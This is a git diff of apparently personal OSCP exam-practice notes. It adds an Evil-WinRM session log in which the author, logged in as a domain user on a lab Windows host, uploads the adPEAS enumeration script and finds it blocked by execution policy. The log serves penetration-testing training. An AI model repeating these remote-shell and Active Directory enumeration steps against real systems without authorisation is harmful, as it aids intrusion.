@@ -41,9 +41,41 @@ oscp\r.andrews S-1-5-21-2468442526-2906141135-4054829294-1105
 ```
 
 get file from vm
+upload ADpeas and it not working
 
-![[{FB3A9F44-C6B9-48A8-A07B-9CE5747D6B48}.png]]
+```
+[+] Success!
+*Evil-WinRM* PS C:\Users\r.andrews\Documents> 
+*Evil-WinRM* PS C:\Users\r.andrews\Documents> ls
+*Evil-WinRM* PS C:\Users\r.andrews\Documents> upload /home/kali/OSCP/Exam/AD/192.168.114.206/adPEAS/adPEAS.ps1
+                                        
+Info: Uploading /home/kali/OSCP/Exam/AD/192.168.114.206/adPEAS/adPEAS.ps1 to C:\Users\r.andrews\Documents\adPEAS.ps1
+                                        
+Data: 6249928 bytes of 6249928 bytes copied
+                                        
+Info: Upload successful!
+*Evil-WinRM* PS C:\Users\r.andrews\Documents> ls
 
+
+    Directory: C:\Users\r.andrews\Documents
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----        11/12/2024   6:36 AM        4687448 adPEAS.ps1
+
+
+*Evil-WinRM* PS C:\Users\r.andrews\Documents> ./adPEAS.ps1
+File C:\Users\r.andrews\Documents\adPEAS.ps1 cannot be loaded because running scripts is disabled on this system. For more information, see about_Execution_Policies at https:/go.microsoft.com/fwlink/?LinkID=135170.
+At line:1 char:1
++ ./adPEAS.ps1
++ ~~~~~~~~~~~~
+    + CategoryInfo          : SecurityError: (:) [], PSSecurityException
+    + FullyQualifiedErrorId : UnauthorizedAccess
+*Evil-WinRM* PS C:\Users\r.andrews\Documents> menu
+                                        
+
+```
 can do anything as user got no permission, script is disabled for this system, maybe winpeas might work
 
 ```
